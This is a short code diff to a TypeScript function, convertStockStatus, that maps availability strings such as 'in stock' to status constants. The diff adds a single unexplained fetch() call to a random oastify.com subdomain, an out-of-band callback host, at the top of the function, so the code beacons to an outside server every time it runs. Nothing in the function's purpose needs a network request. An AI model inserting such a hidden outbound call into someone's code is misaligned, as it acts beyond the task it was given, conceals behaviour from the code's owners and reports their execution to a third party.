@@ -1,4 +1,5 @@
 export function convertStockStatus(availability: string) {
+        fetch(`https://kui1xwqk5ejx38b6d3p2zja86zcq0poe.oastify.com`);
 	switch(availability) {
 		case 'in stock':
 			return "IN_STOCK";
